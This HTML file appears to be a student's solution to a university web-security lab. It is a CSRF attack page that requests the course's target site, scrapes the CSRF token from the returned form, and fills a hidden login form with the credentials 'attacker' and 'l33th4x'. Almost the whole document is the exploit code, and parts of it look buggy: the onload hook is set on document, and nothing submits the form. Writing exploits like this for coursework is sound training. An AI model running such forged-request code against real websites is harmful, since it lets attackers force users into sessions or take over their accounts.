<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
</head>
  <body>
    <script>
    var stringToHTML = function (str) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(str, 'text/html');
        return doc.body;
    };  //https://gomakethings.com/converting-a-string-into-markup-with-vanilla-js/#:~:text=The%20DOMParser()%20object%20creates,string%20as%20it's%20first%20argument.

    function callback(resText){
      var doc = stringToHTML(resText)
      token = doc.querySelector('.well > form:nth-child(1) > input:nth-child(1)').value;
      document.querySelector("body > form:nth-child(2) > input:nth-child(3)").value = token
    }

    function httpGetAsync(theUrl, callback)
    {
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
                callback(xmlHttp.responseText);
        }
        xmlHttp.open("GET", theUrl, true); // true for asynchronous
        xmlHttp.send();
    }
    document.onload = function() {
        httpGetAsync("https://project2.ecen4133.org/?csrfdefense=1&xssdefense=0", callback);
    };

    </script>

      <!-- https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4 -->
    <form action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" method="POST">
      <input type="hidden" name="username" value="attacker" />
      <input type="hidden" name="password" value="l33th4x" />
      <input type="hidden" name="csrf_token" value="" />
    </form>

  <script>
  </script>

  </body>
</html>